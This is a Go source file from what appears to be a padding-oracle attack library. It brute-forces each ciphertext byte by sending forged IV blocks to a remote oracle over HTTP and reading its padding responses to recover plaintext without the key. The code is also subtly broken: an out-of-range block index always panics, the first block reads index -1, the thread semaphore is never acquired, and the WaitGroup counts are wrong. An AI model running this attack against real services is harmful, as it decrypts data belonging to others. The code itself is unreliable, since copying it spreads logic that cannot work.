package libpadoracle

import (
	"errors"
	"fmt"
	"sync"
)

// PerByteOperations performs the actual math on each byte of the CipherText
func PadOperations(cfg Config, cipherText []byte, decipherChan chan Data) {
	defer close(decipherChan)

	threadCh := make(chan struct{}, cfg.Threads)
	wg := sync.WaitGroup{}
	if cfg.IV != nil { // IV was supplied by the user - let's prepend to the Decoded Ciphertext
		cipherText = append(cfg.IV, cipherText...)
	}
	Blocks := ChunkBytes(cipherText, cfg.BlockSize)
	if lastBlockLen := len(Blocks[len(Blocks)]); lastBlockLen != cfg.BlockSize {
		err := errors.New(fmt.Sprintf("Invalid Block Size at Block #%d: %v bytes", len(Blocks), lastBlockLen))
		panic(err)
	}
	wg.Add(len(Blocks))
	for blockNum, blockData := range Blocks[1:] {
		go PerBlockOperations(&wg, cfg, threadCh, decipherChan, blockNum, blockData, Blocks[blockNum-1])
	}
	wg.Wait()
}

// PerByteOperations performs the actual math on each byte of the CipherText
func PerBlockOperations(wg *sync.WaitGroup, cfg Config, threadCh chan struct{}, decipherChan chan Data, blockNum int, blockData []byte, iv []byte) {
	// TODO stuff here
	blockDecipherChan := make(chan byte)

	defer func() {
		close(blockDecipherChan)
		wg.Done()
	}()
	returnData := Data{}
	decipheredBlockBytes := []byte{}
	wg2 := sync.WaitGroup{}
	for byteNum, byteData := range blockData { // Iterate over each byte
		fmt.Printf("Checking Block: %d; Byte %d; val: %d\n", blockNum, byteNum, byteData)
		wg2.Add(1)
		for i := 0; i < 256; i++ {
			go PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes)
		}
		go func() {
			nextByte := <-blockDecipherChan
			decipheredBlockBytes = append([]byte{nextByte}, decipheredBlockBytes...)
		}()
		wg2.Wait()
	}
	returnData.BlockNumber = blockNum
	returnData.EncryptedBlockData = blockData
	returnData.DecipheredBlockData = decipheredBlockBytes
	decipherChan <- returnData
}

// PerByteOperations performs the actual math on each byte of the CipherText
func PerByteOperations(wg *sync.WaitGroup, threadCh chan struct{}, blockDecipherChan chan byte, cfg Config, bruteForceByteValue int, byteNum int, blockNum int, blockData []byte, IV []byte, decipheredBlockBytes []byte) {
	defer func() {
		<-threadCh // Release a thread once we're done with this goroutine
	}()
	var RawOracleData []byte
	// Math here - all the XORing and building of weird padding happens in these routines
	padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)
	searchBlock := BuildSearchBlock(decipheredBlockBytes, bruteForceByteValue, cfg.BlockSize)
	tmp := XORBytes(searchBlock, IV)
	oracleIvBlock := XORBytes(tmp, padBlock)

	RawOracleData = BuildRawOraclePayload(oracleIvBlock, blockData)
	// padBlock := BuildPaddedBlock(IV, blockData, bruteForceByteValue, cfg.blockSize)

	encodedPayload := EncodePayload(RawOracleData)
	httpResp, strResponseBody := CallOracle(encodedPayload)

	if CheckResponse(httpResp, strResponseBody) {
		defer wg.Done()
		blockDecipherChan <- byte(bruteForceByteValue)
	}
}
